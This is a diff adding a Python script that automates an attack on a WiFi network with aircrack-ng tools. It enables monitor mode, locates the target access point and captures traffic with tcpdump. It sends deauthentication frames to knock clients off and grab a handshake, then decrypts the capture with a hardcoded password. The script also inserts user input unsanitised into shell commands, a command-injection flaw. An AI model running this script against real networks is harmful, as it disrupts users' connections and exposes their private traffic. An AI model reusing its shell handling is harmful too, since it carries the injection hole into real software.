@@ -1,0 +1,119 @@
+#! /usr/bin/python3
+
+from subprocess import *  # To talk to terminal
+import re  # To use regular expressions
+import time  # To use the sleep option
+import os  # to check if directory exists
+import shutil
+import signal
+#  import psutil
+
+ESSID = input("What is the ESSID of the AP?\n")
+outputFile = "Something"  # input("Name your output file...\n")
+outputFile = outputFile + ".pcap" # has to be .pcap file, so we add it
+WIFIpassword = "nostradamus"  # "8179ab15c7d8"  # input("What is the wifi password...\n")
+cwd = os.getcwd()  # /root/testing
+dirToTestFolder = cwd + "/.test"
+dirToTest1 = dirToTestFolder + "/test1.txt"
+rawInterface = str()
+monInterface = str()
+
+print("Making new directory...")
+if not os.path.isdir(dirToTestFolder):
+    os.makedirs(dirToTestFolder)
+else:
+    shutil.rmtree(dirToTestFolder)
+
+    os.makedirs(dirToTestFolder)
+
+command = "airmon-ng > {}".format(dirToTest1)
+
+try:
+    print("Getting the raw interface...")
+    call(command, shell=True)  # Popen is to open subprocess
+
+except Exception:
+    pass
+time.sleep(1)
+
+f = open(dirToTest1, "r")
+match = re.findall("\w*wlan\w*", f.read())  # Using RE to find any word containing wlan
+f.close()
+
+if match:
+    rawInterface = match[0]  # Takes the first value from the output file
+
+else:
+    print("The wifi card is not supported or is not connected, please check...")
+    exit()
+
+print("Creating monitoring interface...")
+command = "airmon-ng start {} > /dev/null".format(rawInterface)
+a = Popen(command, shell=True)  # Opening process in terminal with the 3 commands
+a.wait()  # need to wait for process to complete
+command = "ifconfig > {}".format(dirToTest1)
+call(command, shell=True)  # check if monitoring interface was enabled
+f = open(dirToTest1, "r")
+match = re.findall("\w*mon\w*", f.read())  # find any words with mon = wlan0mon
+f.close()
+if match is None:  # match is an object (list), not a string
+    print("The wifi card could not be put in monitor mode, aborting...")
+    exit()
+else:
+    monInterface = match[0]  # if match found, set up the monitoring Int variable
+print("Obtaining MAC Address and Channel number...")
+command = "airodump-ng {} -w .test/newFile 2> /dev/null".format(monInterface)
+firstAIRODUMP = Popen(command, shell=True, preexec_fn=os.setsid)  # -w to write output to a file, in our case 'newFile'
+time.sleep(2)  # waiting for the process to run for 2 seconds, hence imported time
+os.killpg(os.getpgid(firstAIRODUMP.pid), signal.SIGTERM)
+time.sleep(2)
+command = "grep -i {} ./.test/newFile-01.csv | cut -c1-17".format(ESSID)
+command2 = "grep -i {} ./.test/newFile-01.csv | cut -c62-63".format(ESSID)  # finding channel in line containing ESSID
+command3 = "grep -iow {} ./.test/newFile-01.csv".format(ESSID)
+out3 = check_output(command3, shell=True)
+out3 = out3.decode("utf-8")
+numberOfCharacters = len(ESSID)
+ESSID = out3[:numberOfCharacters]
+print(ESSID)
+out = check_output(command, shell=True)  # check_output is function to output the stdout to variable
+out2 = check_output(command2, shell=True)
+BSSID = out.decode("utf-8")
+BSSID = BSSID[:17]
+Channel = out2.decode("utf-8")
+Channel = Channel[:2]
+Channel = Channel.replace(" ", "")
+print("BSSID is", BSSID)
+print("Channel is", Channel)
+print("Setting up monitoring interface in correct channel")
+command = "airmon-ng start {} {} > /dev/null".format(monInterface, Channel)
+call(command, shell=True)  # telling terminal to run the following command
+tcpdump = "tcpdump -i {} -w {} 2> /dev/null".format(monInterface, outputFile) # new python syntax for string format
+print("Starting capturing data...")
+time.sleep(1)
+tcpdumpProc = Popen(tcpdump, shell=True, preexec_fn=os.setsid)  # shell=True to use the string input
+time.sleep(2)
+print("Getting Valid handshake")
+command = "aireplay-ng -0 7 -a {} {} > /dev/null".format(BSSID, monInterface)
+call(command, shell=True)
+time.sleep(2)
+quitNow = input("To quit press \"y\"")
+if quitNow == "y":
+    os.killpg(os.getpgid(tcpdumpProc.pid), signal.SIGTERM)
+    print("Terminating scan!!!")
+time.sleep(1)
+print("Decrypting")
+command = "airdecap-ng -e {} -p {} {} > /dev/null".format(ESSID, WIFIpassword, outputFile)
+a = Popen(command, shell=True)
+a.wait()
+time.sleep(1)
+print("DONE!!")
+
+
+'''parent = psutil.Process(tcpdumpProc.pid)
+    time.sleep(2)
+    print(str(parent))
+    children = parent.children(recursive=True)
+    time.sleep(2)
+    print(children)
+    for process in children:
+        process.send_signal(signal.SIGTERM)'''
